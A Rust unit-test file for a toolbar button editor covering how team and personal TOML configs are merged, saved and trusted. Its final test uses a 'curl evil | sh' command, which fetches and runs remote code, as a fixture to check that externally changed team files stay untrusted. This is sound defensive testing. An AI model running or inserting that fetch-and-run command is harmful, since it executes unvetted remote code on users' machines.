use std::path::Path;

use super::*;
use crate::template::TEAM_TEMPLATE;
use crate::trust::{ToolbarUserState, content_hash};

const TEAM: &str = r#"# Shared buttons for the team.

# Builds the app.
[[button]]
id = "build"   # keep this id
label = "Build"
icon = "build"
command = "./gradlew assembleDebug"
env = { GRADLE_OPTS = "-Xmx4g" }

# Opens CI.
[[button]]
id = "ci"
url = "https://ci.example.com"
"#;

fn model(team: Option<&str>, personal: Option<&str>) -> EditorModel {
    EditorModel::load(team, personal).unwrap()
}

fn ids(model: &EditorModel) -> Vec<&str> {
    model
        .buttons
        .iter()
        .map(|button| button.spec.id.as_str())
        .collect()
}

fn command(text: &str) -> SpecAction {
    SpecAction::Command {
        command: text.to_owned(),
        target: CommandTarget::Current,
        cwd: None,
        env: Vec::new(),
    }
}

fn merged(plan: &SavePlan, team: Option<&str>, personal: Option<&str>) -> Vec<ToolbarButton> {
    let team = plan.team.as_deref().or(team);
    let personal = plan.personal.as_deref().or(personal);
    let team = team.map(|text| parse_config(text, ConfigSource::Team).unwrap());
    let personal = personal.map(|text| parse_config(text, ConfigSource::Personal).unwrap());
    merge(team.as_ref(), personal.as_ref()).unwrap()
}

#[test]
fn loads_both_files_in_toolbar_order() {
    let personal = "[[button]]\nid = \"mine\"\ncommand = \"make me\"\n[[button]]\nid = \"ci\"\nhidden = true\n";

    let model = model(Some(TEAM), Some(personal));

    assert_eq!(ids(&model), vec!["build", "ci", "mine"]);
    assert_eq!(model.buttons[0].scope, Scope::Project);
    assert_eq!(
        model.buttons[0].spec.action,
        SpecAction::Command {
            command: "./gradlew assembleDebug".to_owned(),
            target: CommandTarget::Current,
            cwd: None,
            env: vec![("GRADLE_OPTS".to_owned(), "-Xmx4g".to_owned())],
        }
    );
    assert!(model.buttons[1].hidden);
    assert_eq!(model.buttons[1].scope, Scope::Project);
    assert_eq!(model.buttons[2].scope, Scope::Personal);
}

#[test]
fn a_personal_override_makes_a_project_button_personal() {
    let personal = "[[button]]\nid = \"build\"\nlabel = \"My build\"\ntarget = \"new_tab\"\n";

    let model = model(Some(TEAM), Some(personal));

    let build = &model.buttons[0];
    assert_eq!(build.scope, Scope::Personal);
    assert_eq!(build.spec.label.as_deref(), Some("My build"));
    assert!(matches!(
        build.spec.action,
        SpecAction::Command {
            target: CommandTarget::NewTab,
            ..
        }
    ));
}

#[test]
fn saving_unchanged_buttons_changes_no_file() {
    let personal = "# mine\n[[button]]\nid = \"ci\"\nhidden = true\n";
    let model = model(Some(TEAM), Some(personal));

    let plan = model.plan_save(Some(TEAM), Some(personal)).unwrap();

    assert_eq!(plan, SavePlan::default());
}

#[test]
fn updating_a_button_keeps_comments_and_untouched_keys() {
    let mut model = model(Some(TEAM), None);
    model.buttons[0].spec.label = Some("Assemble".to_owned());

    let plan = model.plan_save(Some(TEAM), None).unwrap();

    let expected = TEAM.replace("label = \"Build\"", "label = \"Assemble\"");
    assert_eq!(plan.team.as_deref(), Some(expected.as_str()));
    assert_eq!(plan.personal, None);
}

#[test]
fn changing_the_action_kind_replaces_the_action_keys() {
    let mut model = model(Some(TEAM), None);
    model.buttons[0].spec.action = SpecAction::Url("https://docs.example.com".to_owned());

    let plan = model.plan_save(Some(TEAM), None).unwrap();

    let team = plan.team.unwrap();
    assert!(team.contains("url = \"https://docs.example.com\""));
    assert!(!team.contains("command ="));
    assert!(!team.contains("env ="));
    assert!(team.contains("id = \"build\"   # keep this id"));
}

#[test]
fn adding_a_button_appends_it_after_the_others() {
    let mut model = model(Some(TEAM), None);
    let mut spec = ButtonSpec::new_command(model.unique_id("Run tests"));
    spec.label = Some("Run tests".to_owned());
    spec.action = SpecAction::Command {
        command: "./gradlew test".to_owned(),
        target: CommandTarget::SplitDown,
        cwd: Some("app".to_owned()),
        env: vec![("CI".to_owned(), "1".to_owned())],
    };
    spec.placement = Placement::Overflow;
    model.add(spec, Scope::Project);

    let plan = model.plan_save(Some(TEAM), None).unwrap();

    let team = plan.team.clone().unwrap();
    assert!(team.starts_with(TEAM));
    assert!(team.ends_with(
        "\n[[button]]\nid = \"run-tests\"\nlabel = \"Run tests\"\ncommand = \"./gradlew test\"\ntarget = \"split_down\"\ncwd = \"app\"\nenv = { CI = \"1\" }\noverflow = true\n"
    ));
    let buttons = merged(&plan, Some(TEAM), None);
    assert_eq!(buttons.len(), 3);
    assert!(buttons[2].overflow_only);
}

#[test]
fn a_panel_command_is_written_with_its_target() {
    let mut model = model(Some(TEAM), None);
    let mut spec = ButtonSpec::new_command(model.unique_id("Logcat"));
    spec.action = SpecAction::Command {
        command: "adb logcat".to_owned(),
        target: CommandTarget::Panel,
        cwd: None,
        env: Vec::new(),
    };
    model.add(spec, Scope::Project);

    let plan = model.plan_save(Some(TEAM), None).unwrap();

    assert!(
        plan.team
            .as_deref()
            .is_some_and(|team| team.contains("command = \"adb logcat\"\ntarget = \"panel\"\n"))
    );
    let buttons = merged(&plan, Some(TEAM), None);
    assert!(matches!(
        &buttons[2].action,
        ButtonAction::Command(CommandAction { target: CommandTarget::Panel, .. })
    ));
}

#[test]
fn reordering_moves_tables_with_their_comments() {
    let mut model = model(Some(TEAM), None);

    assert_eq!(model.move_button(1, -1), Some(0));
    let plan = model.plan_save(Some(TEAM), None).unwrap();

    let team = plan.team.clone().unwrap();
    let ci = team.find("# Opens CI.").unwrap();
    let build = team.find("# Builds the app.").unwrap();
    assert!(ci < build, "{team}");
    assert!(team.starts_with("# Shared buttons for the team.\n"));
    let order: Vec<String> = merged(&plan, Some(TEAM), None)
        .into_iter()
        .map(|button| button.id)
        .collect();
    assert_eq!(order, vec!["ci", "build"]);
}

#[test]
fn deleting_a_button_removes_its_table_and_personal_entries() {
    let personal = "[[button]]\nid = \"build\"\nhidden = true\n";
    let mut model = model(Some(TEAM), Some(personal));

    model.remove(0);
    let plan = model.plan_save(Some(TEAM), Some(personal)).unwrap();

    let team = plan.team.unwrap();
    assert!(!team.contains("build"));
    assert!(team.contains("# Opens CI."));
    assert_eq!(plan.personal.as_deref(), Some(""));
}

#[test]
fn personal_buttons_go_to_the_personal_file_and_create_it_only_when_needed() {
    let mut model = model(Some(TEAM), None);
    assert_eq!(model.plan_save(Some(TEAM), None).unwrap().personal, None);

    let mut spec = ButtonSpec::new_command("emulator".to_owned());
    spec.action = command("emulator -avd Pixel");
    model.add(spec, Scope::Personal);
    let plan = model.plan_save(Some(TEAM), None).unwrap();

    assert_eq!(plan.team, None);
    assert_eq!(
        plan.personal.as_deref(),
        Some("[[button]]\nid = \"emulator\"\ncommand = \"emulator -avd Pixel\"\n")
    );
}

#[test]
fn hiding_a_project_button_writes_a_personal_hidden_entry() {
    let mut model = model(Some(TEAM), None);
    model.buttons[1].hidden = true;

    let plan = model.plan_save(Some(TEAM), None).unwrap();

    assert_eq!(plan.team, None);
    assert_eq!(
        plan.personal.as_deref(),
        Some("[[button]]\nid = \"ci\"\nhidden = true\n")
    );
    let ids: Vec<String> = merged(&plan, Some(TEAM), None)
        .into_iter()
        .map(|button| button.id)
        .collect();
    assert_eq!(ids, vec!["build"]);

    let personal = plan.personal.unwrap();
    let mut model = EditorModel::load(Some(TEAM), Some(&personal)).unwrap();
    model.buttons[1].hidden = false;
    let plan = model.plan_save(Some(TEAM), Some(&personal)).unwrap();
    assert_eq!(plan.personal.as_deref(), Some(""));
}

#[test]
fn moving_a_button_to_personal_scope_keeps_the_project_entry_and_overrides_it() {
    let mut model = model(Some(TEAM), None);
    model.buttons[0].scope = Scope::Personal;
    model.buttons[0].spec.label = Some("Mine".to_owned());

    let plan = model.plan_save(Some(TEAM), None).unwrap();

    assert_eq!(plan.team, None);
    assert_eq!(
        plan.personal.as_deref(),
        Some("[[button]]\nid = \"build\"\nlabel = \"Mine\"\n")
    );
    let buttons = merged(&plan, Some(TEAM), None);
    assert_eq!(buttons[0].label.as_deref(), Some("Mine"));
    // The command is still the team's, so it still needs trust.
    assert_eq!(buttons[0].action_source, ConfigSource::Team);
    assert!(buttons[0].requires_trust());
}

#[test]
fn an_override_that_changes_the_command_owns_it() {
    let mut model = model(Some(TEAM), None);
    model.buttons[0].scope = Scope::Personal;
    assert!(model.runs_team_action(0));
    model.buttons[0].spec.action = command("make");
    assert!(!model.runs_team_action(0));

    let plan = model.plan_save(Some(TEAM), None).unwrap();

    assert_eq!(
        plan.personal.as_deref(),
        Some("[[button]]\nid = \"build\"\ncommand = \"make\"\n")
    );
    let buttons = merged(&plan, Some(TEAM), None);
    assert_eq!(buttons[0].action_source, ConfigSource::Personal);
    assert!(matches!(&buttons[0].action, ButtonAction::Command(command) if command.env.is_empty()));
}

#[test]
fn saving_keeps_an_existing_override_minimal() {
    let personal = "[[button]]\nid = \"build\"\nlabel = \"Mine\"\n";
    let mut model = model(Some(TEAM), Some(personal));
    model.buttons[1].hidden = true;

    let plan = model.plan_save(Some(TEAM), Some(personal)).unwrap();

    assert_eq!(
        plan.personal.as_deref(),
        Some(
            "[[button]]\nid = \"build\"\nlabel = \"Mine\"\n\n[[button]]\nid = \"ci\"\nhidden = true\n"
        )
    );
}

#[test]
fn reverting_an_override_shows_the_project_button_again() {
    let personal = "[[button]]\nid = \"build\"\nlabel = \"Mine\"\n";
    let mut model = model(Some(TEAM), Some(personal));
    assert!(model.is_override(0));

    model.revert_override(0);
    let plan = model.plan_save(Some(TEAM), Some(personal)).unwrap();

    assert_eq!(plan.team, None);
    assert_eq!(plan.personal.as_deref(), Some(""));
}

#[test]
fn a_copy_of_an_override_goes_to_the_team_file() {
    let personal = "[[button]]\nid = \"build\"\nlabel = \"Mine\"\n";
    let mut model = model(Some(TEAM), Some(personal));

    let index = model.duplicate(0).unwrap();

    assert_eq!(model.buttons[index].scope, Scope::Project);
}

#[test]
fn entries_the_team_file_hides_are_kept() {
    let team = format!("{TEAM}\n[[button]]\nid = \"old\"\nhidden = true\n");
    let mut model = model(Some(&team), None);
    assert_eq!(ids(&model), vec!["build", "ci"]);

    model.remove(1);
    let plan = model.plan_save(Some(&team), None).unwrap();

    let saved = plan.team.unwrap();
    assert!(saved.contains("id = \"old\"\nhidden = true"), "{saved}");
    assert!(!saved.contains("ci.example.com"));
}

#[test]
fn moving_an_override_back_to_project_scope_drops_the_personal_entry() {
    let personal = "[[button]]\nid = \"build\"\nlabel = \"Mine\"\n";
    let mut model = model(Some(TEAM), Some(personal));
    model.buttons[0].scope = Scope::Project;

    let plan = model.plan_save(Some(TEAM), Some(personal)).unwrap();

    assert!(plan.team.unwrap().contains("label = \"Mine\""));
    assert_eq!(plan.personal.as_deref(), Some(""));
}

#[test]
fn moves_stay_within_their_group() {
    let personal = "[[button]]\nid = \"mine\"\ncommand = \"x\"\n";
    let mut model = model(Some(TEAM), Some(personal));

    assert_eq!(model.move_target(2, -1), None);
    assert_eq!(model.move_target(1, 1), None);
    assert_eq!(model.move_target(0, -1), None);
    assert_eq!(model.move_target(0, 1), Some(1));

    model.buttons[0].scope = Scope::Personal;
    model.buttons[2].scope = Scope::Project;
    model.normalize();
    assert_eq!(ids(&model), vec!["build", "ci", "mine"]);
    assert!(model.is_team_located(2));
}

#[test]
fn duplicate_gets_a_unique_id_after_the_original() {
    let mut model = model(Some(TEAM), None);

    let index = model.duplicate(0).unwrap();

    assert_eq!(index, 1);
    assert_eq!(model.buttons[1].spec.id, "build-copy");
    assert_eq!(model.buttons[1].spec.label.as_deref(), Some("Build copy"));
    assert_eq!(model.duplicate(0), Some(1));
    assert_eq!(model.buttons[1].spec.id, "build-copy-2");
}

#[test]
fn first_button_in_a_template_goes_below_its_comments() {
    let mut model = model(Some(TEAM_TEMPLATE), None);
    let mut spec = ButtonSpec::new_command("hello".to_owned());
    spec.action = command("echo hi");
    model.add(spec, Scope::Project);

    let plan = model.plan_save(Some(TEAM_TEMPLATE), None).unwrap();

    let team = plan.team.unwrap();
    assert!(team.starts_with(TEAM_TEMPLATE), "{team}");
    assert!(team.ends_with("\n[[button]]\nid = \"hello\"\ncommand = \"echo hi\"\n"));
}

#[test]
fn a_new_project_creates_the_team_file_only_with_a_button() {
    let mut model = model(None, None);
    assert_eq!(model.plan_save(None, None).unwrap(), SavePlan::default());

    let mut spec = ButtonSpec::new_command("hello".to_owned());
    spec.action = command("echo ${file}");
    model.add(spec, Scope::Project);
    let plan = model.plan_save(None, None).unwrap();

    assert_eq!(
        plan.team.as_deref(),
        Some("[[button]]\nid = \"hello\"\ncommand = \"echo ${file}\"\n")
    );
}

#[test]
fn invalid_buttons_are_reported_with_their_index() {
    let mut model = model(Some(TEAM), None);
    model.buttons[1].spec.action = SpecAction::Url("ftp://x".to_owned());
    assert_eq!(
        model.plan_save(Some(TEAM), None).unwrap_err().button,
        Some(1)
    );

    let mut model = self::model(Some(TEAM), None);
    model.buttons[1].spec.id = "build".to_owned();
    let error = model.plan_save(Some(TEAM), None).unwrap_err();
    assert_eq!(error.button, Some(1));
    assert!(error.message.contains("used by another button"));
}

#[test]
fn multi_line_commands_round_trip() {
    let mut model = model(None, None);
    let mut spec = ButtonSpec::new_command("two".to_owned());
    spec.action = command("echo one\necho \"two\"");
    model.add(spec.clone(), Scope::Project);

    let plan = model.plan_save(None, None).unwrap();
    let reloaded = EditorModel::load(plan.team.as_deref(), None).unwrap();

    assert_eq!(reloaded.buttons[0].spec, spec);
}

#[test]
fn spec_converts_to_a_runnable_button() {
    let mut spec = ButtonSpec::new_command("t".to_owned());
    spec.action = SpecAction::Command {
        command: "make".to_owned(),
        target: CommandTarget::NewTab,
        cwd: Some(" ".to_owned()),
        env: vec![("A".to_owned(), "1".to_owned())],
    };
    spec.icon = Some("play".to_owned());

    let button = spec.to_toolbar_button(ConfigSource::Personal).unwrap();

    assert_eq!(
        button.action,
        ButtonAction::Command(CommandAction {
            command: "make".to_owned(),
            target: CommandTarget::NewTab,
            cwd: None,
            env: [("A".to_owned(), "1".to_owned())].into(),
        })
    );
    assert!(!button.requires_trust());
    assert!(
        ButtonSpec::new_command("e".to_owned())
            .to_toolbar_button(ConfigSource::Team)
            .is_err()
    );
}

#[test]
fn slug_makes_readable_ids() {
    assert_eq!(slug("Run  Tests!"), "run-tests");
    assert_eq!(slug("  "), "button");
    assert_eq!(slug("Сборка"), "сборка");
}

#[test]
fn gui_save_of_a_trusted_team_file_stays_trusted() {
    let root = Path::new("/p");
    let mut state = ToolbarUserState::default();
    state.trust(root, &content_hash(TEAM.as_bytes()), &[]);
    let mut model = model(Some(TEAM), None);
    model.buttons[0].spec.action = command("./gradlew build");
    let new_team = model.plan_save(Some(TEAM), None).unwrap().team.unwrap();

    assert!(state.record_gui_save(root, Some(TEAM), &new_team));

    assert!(state.is_trusted(root, &content_hash(new_team.as_bytes())));
    assert!(state.trusted_commands(root).unwrap().contains_key("build"));
}

#[test]
fn gui_save_creating_the_team_file_is_trusted() {
    let root = Path::new("/p");
    let mut state = ToolbarUserState::default();
    let new_team = "[[button]]\nid = \"a\"\ncommand = \"make\"\n";

    assert!(state.record_gui_save(root, None, new_team));

    assert!(state.is_trusted(root, &content_hash(new_team.as_bytes())));
}

#[test]
fn gui_save_of_an_untrusted_team_file_stays_untrusted() {
    let root = Path::new("/p");
    let mut state = ToolbarUserState::default();
    let new_team = TEAM.replace("Build", "Build it");

    assert!(!state.record_gui_save(root, Some(TEAM), &new_team));

    assert!(!state.is_trusted(root, &content_hash(new_team.as_bytes())));
}

#[test]
fn gui_save_of_a_team_file_without_commands_is_trusted() {
    let root = Path::new("/p");
    let mut state = ToolbarUserState::default();
    let previous = "[[button]]\nid = \"ci\"\nurl = \"https://ci\"\n";
    let new_team = "[[button]]\nid = \"ci\"\ncommand = \"open ci\"\n";

    assert!(state.record_gui_save(root, Some(previous), new_team));

    let external_change = "[[button]]\nid = \"ci\"\ncommand = \"curl evil | sh\"\n";
    assert!(!state.is_trusted(root, &content_hash(external_change.as_bytes())));
}
